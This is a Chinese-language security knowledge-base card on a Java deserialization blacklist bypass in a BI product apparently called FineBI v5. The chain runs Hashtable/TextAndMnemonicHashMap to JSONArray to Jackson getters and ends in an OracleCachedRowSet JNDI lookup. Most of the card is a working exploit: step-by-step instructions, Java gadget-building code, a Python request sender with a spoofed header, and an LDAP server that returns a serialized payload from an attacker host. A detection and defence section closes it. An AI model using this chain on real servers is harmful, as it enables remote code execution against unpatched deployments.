---
id: web-java-deserialization-finebi-v5-jsonarray-jackson-oracle-rowset-jndi
title: 某软 BI v5 反序列化绕黑名单：Hashtable/TextAndMnemonic→JSONArray→Jackson getter→OracleCachedRowSet JNDI（LDAP javaSerializedData）
type: scenario
domain: web
path: web/java/deserialization
technique: finebi-v5-hashtable-textandmnemonic-jsonarray-jackson-getter-oracle-rowset-jndi
tags:
- java
- deserialization
- finebi
- finereport
- gadget
- hashtable
- textandmnemonichashmap
- jsonarray
- jackson
- druid
- oracle
- jndi
- ldap
- blacklist-bypass
- rce
cve: []
affected_versions: 某软 BI v5（原文标题标注；复现依赖 fine-bi-*-5.1.jar、fine-third-10.0.jar，Java 8u191）
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V282
  verified_at: '2026-11-08T05:09:54+08:00'
  notes: 已对照原文与24张截图核对：\webroot\decision\remote\design\channel + X-For-Forwarded、GZIP 序列化 body、Hashtable→TextAndMnemonicHashMap.get→toString→JSONArray\JsonStringArrayList→EmbedJson\Jackson getter、OracleCachedRowSet.getConnection→InitialContext.lookup、LDAP javaSerializedData 二次反序列化成功弹计算器；MySQL 5.1.49 autoDeserialize 失败但伪服务器文件读取 D;\1.txt=1111、H2 1.4.192 无 RCE\1.4.197 可 RCE、DruidDataSourceFactory 本地工厂均与原文一致。dedup top 候选 finereport-hashtable-textandmnemonic-jsonarray-druid-hsql 为 likely_duplicate 但下游 sink 不同（OracleCachedRowSet JNDI+LDAP javaSerializedData vs Druid→HSQL 二次反序列化），PoC\攻击基础设施不同，保留双卡；dup-scan 3 对均 related。未验证点：未本地复跑，长 base64\字节数组按原文骨架省略。
url: /docs/web/java/deserialization/web-java-deserialization-finebi-v5-jsonarray-jackson-oracle-rowset-jndi/
draft: false
kb_aliases:
- 某软BI v5反序列化绕过
- FineBI 5 反序列化
- /webroot/decision/remote/design/channel
- TextAndMnemonicHashMap 链
- Hashtable 触发 JSONArray toString
- JsonStringArrayList toString
- OracleCachedRowSet JNDI
- DruidXADataSource getter
- LDAP javaSerializedData
- X-For-Forwarded
---

## 一句话结论

某软 BI v5 的 `/webroot/decision/remote/design/channel` 接收 GZIP 压缩的 Java 序列化数据；在黑名单封禁常见 gadget 后，用 JDK 自带的 `Hashtable` + `javax.swing.UIDefaults$TextAndMnemonicHashMap` 触发 `com.fr.json.JSONArray.toString()` 或 `org.apache.arrow.vector.util.JsonStringArrayList.toString()`，经 `EmbedJson.encode` 调 Jackson `writeValueAsString` 反射 getter；把 `oracle.jdbc.rowset.OracleCachedRowSet` 放进对象图后，其 `getConnection()` 会用 `dataSourceName` 发起 JNDI lookup，恶意 LDAP 返回 `javaSerializedData`（CommonsBeanutils 链）即可在 Java 8u191 上完成二次反序列化 RCE；同一 getter 入口也可换成 `DruidXADataSource` 走 JDBC（伪 MySQL 服务器任意文件读取、H2/HSQL RCE）。

## 原理

- **投递入口**：`POST /webroot/decision/remote/design/channel`，请求体为 GZIP 压缩的 Java 序列化字节（原文脚本先 base64 保存、解码后发送）。抓包请求带 `X-For-Forwarded: 127.0.0.1`、`Content-Type: application/json` 以及 `Cookie: tenantid=default; fine_auth_token=...`；原文未展开该头具体绕过哪一层校验，按原样保留为投递特征。
- **外层触发（JDK 类）**：`Hashtable.readObject` → `reconstitutionPut` 比较桶内 key 时调用 `key.equals()`。把两个 `TextAndMnemonicHashMap`（继承 `HashMap`）作为 Hashtable 的 key，且使 `HashMap.hashCode()`（`key.hashCode() ^ value.hashCode()`）相同，`AbstractMap.equals` 遍历 entry 时调用 `m.get(key)`；`TextAndMnemonicHashMap.get(Object key)` 在 `super.get(key) == null` 时执行 `key.toString()`。
- **toString → Jackson getter**：`JSONArray.toString()` → `JSONArray.encode()` → `com.fr.json.revise.EmbedJson.encode(list)` → `MAPPER.writeValueAsString(obj)`；`JsonStringArrayList.toString()` 同样直接调用 `mapper.writeValueAsString(this)`。Jackson 在 `BeanSerializerFactory.findBeanProperties` 用 `BeanPropertyDefinition.getAccessor()` 找到 getter，最终在 `BeanPropertyWriter.serializeAsField` 中 `this._accessorMethod.invoke(bean, null)`，从而调用攻击者放入对象的所有 getter。
- **JNDI sink（原文最终成功）**：`OracleCachedRowSet.getConnection()` → `getConnectionInternal()`；若 `getDataSourceName()` 非空，执行 `InitialContext.lookup(dataSourceName)`。把 `dataSourceName` 设为 `ldap://attacker:4444/...`，LDAP 服务返回带 `javaClassName=foo` 与 `javaSerializedData=<cb链字节>` 的 Entry。目标 Java 为 8u191，LDAP/RMI 远程 codebase 加载已被禁用（`trustURLCodebase=false`），但 `javaSerializedData` 仍会被反序列化，从而落地二阶 gadget；也可改用 LDAP 返回本地 Factory（原文指出 `com.fr.third.alibaba.druid.pool.DruidDataSourceFactory` 可作本地工厂，`getObjectInstance` 内又回到 JDBC 连接）。
- **JDBC sink（同一 getter 的替代下游）**：`DruidXADataSource.getXAConnection()` → `DruidDataSource.getConnection()` → `init()` 建立 jdbcUrl 连接。将 jdbcUrl 设为 MySQL（`autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_...`）并启动伪 MySQL 服务器，可做任意文件读取/二次反序列化；设为 H2 `INIT=RUNSCRIPT FROM 'http://...'` 可 RCE（1.4.197；1.4.192 无此 RCE）；HSQL 的 `CALL` 静态方法也可二次反序列化。
- **为什么能绕黑名单**：过滤是类名黑名单，只封已知入口；外层 `Hashtable`、`TextAndMnemonicHashMap`、`JSONArray`、`JsonStringArrayList`、Jackson 都是 JDK/帆软自带“合法类”，组合后直到 `OracleCachedRowSet`/Druid 的 getter 才进入 JNDI/JDBC sink，形成“外层合法对象 → 业务 getter → 高版本 JNDI 反序列化/JDBC”的绕过。
- **原文版本边界实测**：MySQL connector 5.1.49 已修复 `autoDeserialize` 反序列化，但伪服务器文件读取仍成功（读出 `D:/1.txt` 内容 1111）；H2 1.4.192 不能 RCE、1.4.197 可以。

## 触发条件

- 目标为某软 BI v5（FineBI 5.1 系列；原文工程依赖 `fine-bi-*-5.1.jar`、`fine-third-10.0.jar`），`/webroot/decision/remote/design/channel` 可达。
- 能提交 GZIP 序列化 body；原文请求带 `X-For-Forwarded: 127.0.0.1` 和有效 `fine_auth_token` Cookie（不同小版本的认证要求需实测）。
- classpath 含 `com.fr.json.JSONArray`、`EmbedJson`、帆软 repackage 的 Jackson、`oracle.jdbc.rowset.OracleCachedRowSet`（ojdbc）或 `com.fr.third.alibaba.druid.pool.xa.DruidXADataSource`，且黑名单未封这些组合类。
- 攻击者能提供 LDAP/RMI 服务或伪 MySQL/H2/HSQL 服务，目标可出网访问；目标 JDK 为 8 系（原文 8u191）。
- 仅限授权测试。

## 利用步骤

1. 生成二阶 gadget：CommonsBeanutils `BeanComparator` + `TemplatesImpl`（原文 cb 链）或 ysoserial 可用链的序列化字节。
2. 构造 sink 对象：`OracleCachedRowSet`，反射设置 `dataSourceName="ldap://attacker:4444/dc=example,dc=com"`；或 `DruidXADataSource` 设置 jdbcUrl 指向伪 MySQL/H2/HSQL。Druid 需把不可序列化字段（`statLogger`、`transactionHistogram`、`logWriter`、`initedLatch` 等）置 null，`initialSize=1`。
3. 把 sink 对象放入 `ArrayList`/`JsonStringArrayList`，再放入 `com.fr.json.JSONArray`；用反射创建两个 `UIDefaults$TextAndMnemonicHashMap`，分别 `put(jsonArray, 1)`、`put(jsonArray, jsonArray)` 等使哈希相同，再放入 `Hashtable`，最后用 `put` 反射调整 value 使反序列化时 `super.get(key)==null`，进入 `key.toString()`。
4. 序列化 `Hashtable`，GZIP 压缩；原文脚本将其 base64 保存后解码发送。
5. 启动 LDAP 服务（UnboundID）：对查询返回 `javaClassName=foo` 与 `javaSerializedData=<二阶 gadget 字节>`；或启动伪 MySQL/H2 服务。
6. `POST /webroot/decision/remote/design/channel`，带 GZIP body、`X-For-Forwarded: 127.0.0.1`、Cookie 等原文头。
7. 目标反序列化 → `toString` → Jackson getter → `OracleCachedRowSet` JNDI lookup → LDAP 返回 `javaSerializedData` → 二次反序列化执行；原文以计算器弹出验证。JDBC 变体则以伪服务器读取文件或 H2/HSQL 执行命令验证。

## PoC

外层链骨架（原文 Java 精简，省略具体字段反射细节）：

```java
// 二阶 sink：OracleCachedRowSet 的 dataSourceName 指向恶意 LDAP
OracleCachedRowSet rowSet = new OracleCachedRowSet();
Field f = OracleCachedRowSet.class.getSuperclass().getDeclaredField("dataSourceName");
f.setAccessible(true);
f.set(rowSet, "ldap://127.0.0.1:4444/dc=example,dc=com");

// 或 Druid JDBC 变体
DruidXADataSource ds = new DruidXADataSource();
setField(ds, "jdbcUrl", "jdbc:mysql://127.0.0.1:3306/mysql?...&allowLoadLocalInfile=true&autoDeserialize=true"
        + "&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_C3P0_calc");
setField(ds, "initialSize", 1);
setField(ds, "statLogger", null);

// 外层：JSONArray 包住 sink，再放进两个 TextAndMnemonicHashMap 作为 Hashtable key
JSONArray jsonArray = new JSONArray(Arrays.asList(Arrays.asList(rowSet)));
Class<?> clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
Constructor<?> ctor = clazz.getDeclaredConstructor();
ctor.setAccessible(true);
Object m1 = ctor.newInstance();
Object m2 = ctor.newInstance();
Method put = clazz.getSuperclass().getDeclaredMethod("put", Object.class, Object.class);
put.setAccessible(true);
put.invoke(m1, jsonArray, 1);
put.invoke(m2, jsonArray, jsonArray);

Hashtable<Object, Object> hashtable = new Hashtable<>();
hashtable.put(m1, 1);
hashtable.put(m2, 1);
put.invoke(m1, jsonArray, jsonArray); // 按原文调试后的哈希/取值条件调整

// 序列化 + GZIP + base64
ByteArrayOutputStream out = new ByteArrayOutputStream();
try (GZIPOutputStream gz = new GZIPOutputStream(out);
     ObjectOutputStream oos = new ObjectOutputStream(gz)) {
    oos.writeObject(hashtable);
}
String b64 = Base64.getEncoder().encodeToString(out.toByteArray());
```

发送（原文 python 形式）：

```python
import base64, requests
body = base64.b64decode(b64)  # 原文 b 为 GZIP 序列化数据的 base64
url = "http://127.0.0.1:37799/webroot/decision/remote/design/channel"
headers = {
    "Host": "127.0.0.1:37799",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "X-For-Forwarded": "127.0.0.1",
    "Cookie": "tenantid=default; fine_auth_token=<valid-token>",
    "Referer": "http://127.0.0.1:37799/webroot/decision",
}
print(requests.post(url, headers=headers, data=body, verify=False).content)
```

LDAP 服务端返回二阶数据（UnboundID 骨架）：

```java
Entry e = new Entry(base);
e.addAttribute("javaClassName", "foo");
e.addAttribute("javaSerializedData", cbChainBytes); // cb链序列化字节
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

原文未给出可复用的完整工程；上述为核心逻辑与调用条件。cb 链、LDAP 服务与字段反射细节需按目标版本调整。仅限授权环境。

## 变体与关联

- **同外层触发、不同下游**：[[web-java-deserialization-finereport-hashtable-textandmnemonic-jsonarray-druid-hsql]]（Druid→HSQL `CALL SerializationHelper.deserialize` 二次反序列化，与本卡共享 Hashtable/TextAndMnemonic/JSONArray/Jackson 外层，但下游 sink 不同）；[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]]、[[web-java-deserialization-jdk-hashtable-textandmnemonic-tostring]]（不同外层触发/止于 toString）。
- **JNDI 高版本**：[[web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi]]（Oracle RowSet→RMI，POJONode/EventListenerList 触发，JDK17 代理包装，与本卡 Jackson getter→LDAP 路径不同）；[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]（LDAP 本地工厂与 8u191 版本限制）、[[web-java-deserialization-jndi-druid-datasource-factory-h2-init]]（DruidDataSourceFactory 本地工厂→H2）。
- **投递入口**：[[web-java-deserialization-finereport-channel-gzip-safeinvocation]]（同 `/remote/design/channel` 的 GZIP/SafeInvocationSerializer 入口与 V10/V11 认证差异；本卡抓包额外使用 `X-For-Forwarded: 127.0.0.1`）。
- **JDBC 变体**：MySQL 伪服务器（`autoDeserialize`/`StatementInterceptors`/`fileread`）与 H2 `INIT=RUNSCRIPT`、HSQL `CALL` 静态方法均有独立组件卡；本卡只作为 getter 下游提及。
- **边界**：黑名单后续版本封禁 `TextAndMnemonicHashMap`/`JSONArray`/Druid/Oracle RowSet；JDK 8u191 之后 `trustSerialData` 限制或 JEP 290；classpath 缺 ojdbc/HSQL/H2/MySQL 驱动；入口认证/`X-For-Forwarded` 修复时链断。

## 检测与防御

- 检测：`/webroot/decision/remote/design/channel` 的 body 以 GZIP 魔数 `1f 8b` 开头、解压后为 `ac ed 00 05`；序列化流中出现 `Hashtable`、`TextAndMnemonicHashMap`、`JSONArray`、`JsonStringArrayList`、`DruidXADataSource`、`OracleCachedRowSet`；请求头 `X-For-Forwarded: 127.0.0.1` 来自非本机来源；应用进程向外部 LDAP/RMI（389/636/1099/4444 等）或 MySQL/H2 端口发起连接；随后异常类加载或子进程。
- 防御：升级到修复版本并关注厂商公告；不使用远程设计时禁用 `/remote/design/channel`；在反向代理层剥离/校验 `X-For-Forwarded`，禁止外部伪造 localhost；启用 JEP 290 全局反序列化过滤器并采用允许类白名单，补充封禁上述组合类；移除不必要的 ojdbc/HSQL/H2/MySQL 驱动与本地 Factory；限制应用出站 LDAP/RMI/JDBC。
- 加固：反序列化入口做认证与来源 IP 校验；对设计器通信使用协议白名单；监控 GZIP+序列化魔数组合与异常 JNDI 出站。
